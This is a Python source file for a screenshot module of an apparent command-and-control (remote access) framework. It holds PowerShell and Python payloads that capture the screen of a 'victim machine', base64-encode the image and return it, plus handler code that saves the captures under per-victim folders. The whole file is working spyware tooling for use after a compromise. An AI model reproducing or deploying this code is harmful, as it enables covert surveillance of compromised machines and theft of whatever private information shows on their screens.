import sys
import os
import pdb
import pathlib
import time
import base64
sys.path.append(os.path.join(str(pathlib.Path(__file__).parent.resolve()),'../../lib'))

from module import Module

class Screenshot(Module):
	@classmethod
	def module_options(cls):
		h = {
			'Path' : 'Directory to download the screenshot on the server. Default is victim_data/<victim_id>' 
		}
		return h

	def __init__(self,name,utility,language):

		description = 'This module takes a screenshot on the victim machine using the python mss module.'

		super(Screenshot, self).__init__(name,description,utility,language,getattr(self,f"script_{language}")())    

	def handle_task_output(self,data,options,victim_id):

		## Default Dumping path
		dump_path = os.path.join(str(pathlib.Path(__file__).parent.resolve()),'../../victim_data',victim_id)

		if not os.path.exists(dump_path):
			os.makedirs(dump_path)

		filename = "screenshot_"+time.strftime("%Y%m%d-%H%M%S")+".png"
		ss_path = os.path.join(dump_path,filename)

		if 'Path' in  options:
			if not os.path.exists(options['Path']):
				print(f"Provided save path does not exists - {options['Path']}. Saving to default directory {ss_path}")
			else:
				ss_path = os.path.join(options['Path'],filename)

		## Screenshot is base64 encoded
		b64encoded_string = data
		decoded_string = base64.b64decode(b64encoded_string)


		## Dump the screenshot
		with open(ss_path, "wb") as f:
			f.write(decoded_string)
		f.close()

		output = 'Screeshot saved to '+ss_path
		return output


	def script_powershell(self):
		return """[Reflection.Assembly]::LoadWithPartialName("System.Drawing") | out-null
        function screenshot([Drawing.Rectangle]$bounds) {

           ## Instead of saving
           $ms = New-Object System.IO.MemoryStream;
           
           $bmp = New-Object Drawing.Bitmap $bounds.width, $bounds.height
           $graphics = [Drawing.Graphics]::FromImage($bmp)

           $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)


           $graphics.Dispose()
           $bmp.save($ms, [Drawing.Imaging.ImageFormat]::Png);
           $bmp.Dispose()

           [convert]::ToBase64String($ms.ToArray());

        }

        $bounds = [Drawing.Rectangle]::FromLTRB(0, 0, 1920, 1080)
        $bytes = screenshot $bounds

        return $bytes"""

	def script_python(self):
		return """def execute_command():
        from mss import mss
        import os
        import base64
        ## Take screenshot
        with mss() as sct:
            filename = sct.shot()

        image_path = os.path.join(os.getcwd(),filename)
        if os.path.isfile(image_path):
            content = open(image_path,"rb").read()
            enc_content = base64.b64encode(content)
            os.remove(image_path)
            return enc_content
        else:
            return False"""

